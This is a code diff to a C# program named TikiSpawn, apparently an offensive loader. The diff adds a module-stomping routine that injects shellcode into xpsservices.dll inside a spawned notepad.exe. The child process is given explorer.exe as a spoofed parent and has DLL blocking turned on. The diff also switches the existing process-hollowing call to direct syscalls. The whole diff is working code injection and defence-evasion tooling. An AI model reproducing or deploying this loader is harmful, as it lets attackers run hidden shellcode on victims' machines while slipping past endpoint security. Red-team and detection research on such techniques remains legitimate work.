@@ -33,15 +33,31 @@ namespace TikiSpawn
         
         private static void Main(string[] args)
         {
+            var parent = Process.GetProcessesByName("explorer")[0];
+            
+            // Module Stomping
+            var stomper = new Stomper
+            {
+                BinaryPath = @"C:\Windows\System32\notepad.exe",
+                WorkingDirectory = @"C:\Windows\System32",
+                ParentId = parent.Id,
+                BlockDlls = true,
+                ModuleName = "xpsservices.dll",
+                ExportName = "DllCanUnloadNow"
+            };
+            
+            stomper.Stomp(Shellcode, useSyscalls: true);
+
+            // Process Hollowing
             var hollower = new Hollower
             {
                 BinaryPath = @"C:\Windows\System32\notepad.exe",
                 WorkingDirectory = @"C:\Windows\System32",
-                ParentId = Process.GetProcessesByName("explorer")[0].Id,
+                ParentId = parent.Id,
                 BlockDlls = true
             };
             
-            hollower.Hollow(Shellcode);
+            hollower.Hollow(Shellcode, useSyscalls: true);
         }
     }
 }
